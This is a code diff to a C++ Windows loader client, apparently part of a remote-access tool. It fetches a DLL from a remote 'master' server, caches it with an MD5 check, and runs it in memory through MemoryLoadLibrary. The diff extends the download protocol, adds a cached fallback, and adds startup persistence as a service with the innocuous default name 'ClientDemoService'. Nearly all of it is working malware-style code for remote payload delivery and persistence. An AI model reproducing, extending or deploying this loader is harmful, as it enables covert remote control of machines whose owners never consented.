@@ -5,6 +5,7 @@
 #include <WS2tcpip.h>
 #include <common/commands.h>
 #include "common/dllRunner.h"
+#include <common/md5.h>
 #include <common/iniFile.h>
 #include "auto_start.h"
 // A shell code loader connect to 127.0.0.1:6543.
@@ -39,11 +40,16 @@ BOOL status = 0;
 
 HANDLE hEvent = NULL;
 
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_MEMDLL };
 
 BOOL CALLBACK callback(DWORD CtrlType)
 {
-    if (CtrlType == CTRL_CLOSE_EVENT) {
+#ifdef _DEBUG
+    BOOL isClose = (CtrlType == CTRL_C_EVENT) || (CtrlType == CTRL_CLOSE_EVENT);
+#else
+    BOOL isClose = (CtrlType == CTRL_CLOSE_EVENT);
+#endif
+    if (isClose) {
         status = 1;
         if (hEvent) SetEvent(hEvent);
         if(stop) stop();
@@ -75,11 +81,11 @@ class MemoryDllRunner : public DllRunner
 {
 protected:
     HMEMORYMODULE m_mod;
-    std::string GetIPAddress(const char* hostName)
+    std::string GetIPAddress(const std::string& hostName)
     {
         // 1. 判断是不是合法的 IPv4 地址
         sockaddr_in sa;
-        if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
+        if (inet_pton(AF_INET, hostName.c_str(), &(sa.sin_addr)) == 1) {
             // 是合法 IPv4 地址，直接返回
             return std::string(hostName);
         }
@@ -90,7 +96,7 @@ protected:
         hints.ai_socktype = SOCK_STREAM;
         hints.ai_protocol = IPPROTO_TCP;
 
-        if (getaddrinfo(hostName, nullptr, &hints, &res) != 0)
+        if (getaddrinfo(hostName.c_str(), nullptr, &hints, &res) != 0)
             return "";
 
         char ipStr[INET_ADDRSTRLEN] = {};
@@ -108,9 +114,13 @@ public:
         if (WSAStartup(MAKEWORD(2, 2), &wsaData))
             return nullptr;
 
-        const int bufSize = 4 * 1024 * 1024;
+        const int bufSize = 8 * 1024 * 1024;
         char* buffer = new char[bufSize];
         bool isFirstConnect = true;
+        int  requestCount = 0;
+        binFile bin(CLIENT_PATH);
+        iniFile ini(CLIENT_PATH);
+        auto hash = ini.GetStr("settings", "version", "");
 
         do {
             if (!isFirstConnect)
@@ -128,7 +138,7 @@ public:
             sockaddr_in serverAddr = {};
             serverAddr.sin_family = AF_INET;
             serverAddr.sin_port = htons(g_ConnectAddress.ServerPort());
-            std::string ip = GetIPAddress(g_ConnectAddress.ServerIP());
+            std::string ip = GetIPAddress(g_ConnectAddress.GetRandomServerIP());
             serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
             if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                 closesocket(clientSocket);
@@ -136,40 +146,77 @@ public:
                 continue;
             }
 #ifdef _DEBUG
-            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
+            char command[64] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
 #else
-            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
+            char command[64] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
 #endif
-            char req[sizeof(PkgHeader) + 4] = {};
-            memcpy(req, &PkgHeader(4), sizeof(PkgHeader));
+            memcpy(command + 4, __DATE__, 11);  // 发送版本日期用于大 DLL 检查
+            memcpy(command + 32, hash.c_str(), min(32, hash.length()));
+            char req[sizeof(PkgHeader) + sizeof(command)] = {};
+            memcpy(req, &PkgHeader(sizeof(command)), sizeof(PkgHeader));
             memcpy(req + sizeof(PkgHeader), command, sizeof(command));
             auto bytesSent = send(clientSocket, req, sizeof(req), 0);
             if (bytesSent != sizeof(req)) {
                 closesocket(clientSocket);
                 continue;
             }
-            char* ptr = buffer + sizeof(PkgHeader);
             int bufferSize = 16 * 1024, bytesReceived = 0, totalReceived = 0;
-            while (totalReceived < bufSize) {
-                int bytesToReceive = min(bufferSize, bufSize - totalReceived);
-                int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
-                if (bytesReceived <= 0) break;
-                totalReceived += bytesReceived;
+            if (requestCount < 3) {
+                requestCount++;
+                time_t tm = time(NULL);
+                while (totalReceived < bufSize) {
+                    int bytesToReceive = min(bufferSize, bufSize - totalReceived);
+                    int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
+                    if (bytesReceived <= 0) {
+                        Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
+                        break;
+                    }
+                    totalReceived += bytesReceived;
+                    if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
+                        Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
+                        break;
+                    }
+                }
             }
-            if (totalReceived < sizeof(PkgHeader) + 6) {
+            else {
                 closesocket(clientSocket);
+                break;
+            }
+
+            PkgHeader* header = (PkgHeader*)buffer;
+            if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
+                Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
+                closesocket(clientSocket);
+                if (hash[0])break;
                 continue;
             }
+            char* ptr = buffer + sizeof(PkgHeader);
             BYTE cmd = ptr[0], type = ptr[1];
             size = 0;
             memcpy(&size, ptr + 2, sizeof(int));
-            if (totalReceived != size + 6 + sizeof(PkgHeader)) {
-                continue;
+            if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
+                closesocket(clientSocket);
+                break;
             }
             closesocket(clientSocket);
-        } while (false);
+            WSACleanup();
+            const auto md5 = CalcMD5FromBytes((BYTE*)buffer + 22, size);
+            bin.SetStr("settings", "data", std::string(buffer, 22 + size));
+            ini.SetStr("settings", "version", md5);
+            Mprintf("Save data[%s] to registry: %d bytes\n", md5.c_str(), size);
+            return buffer;
+        } while (1);
 
         WSACleanup();
+        auto data = bin.GetStr("settings", "data");
+        auto md5 = data.empty() ? "" : CalcMD5FromBytes((BYTE*)data.data()+22, data.length()-22);
+        if (md5.empty() || md5 != hash){
+            SAFE_DELETE_ARRAY(buffer);
+            return NULL;
+        }
+        size = data.length() - 22;
+        memcpy(buffer, data.data(), data.length());
+        Mprintf("Read data[%s] from registry succeed: %d bytes\n", md5.c_str(), size);
         return buffer;
     }
     // Request DLL from the master.
@@ -194,6 +241,8 @@ public:
             addr->protoType = g_ConnectAddress.protoType;
             addr->runningType = g_ConnectAddress.runningType;
             strcpy(addr->szGroupName, g_ConnectAddress.szGroupName);
+            strcpy(addr->installDir, g_ConnectAddress.installDir);
+            strcpy(addr->installName, g_ConnectAddress.installName);
         }
         m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
         SAFE_DELETE_ARRAY(buffer);
@@ -222,7 +271,7 @@ int main(int argc, const char *argv[])
                            g_ConnectAddress.installName[0] ? g_ConnectAddress.installName : "ClientDemoService",
                            g_ConnectAddress.installDir[0] ? g_ConnectAddress.installDir : "Client Demo Service",
                            g_ConnectAddress.installDesc[0] ? g_ConnectAddress.installDesc : "Provide a demo service."), Log);
-    bool isService = g_ConnectAddress.iStartup == Startup_TestRunMsc;
+    bool isService = g_ConnectAddress.iStartup == Startup_TestRunMsc || IsSystemInSession0();
     // 注册启动项
     int r = RegisterStartup(
                 g_ConnectAddress.installDir[0] ? g_ConnectAddress.installDir : "Client Demo",
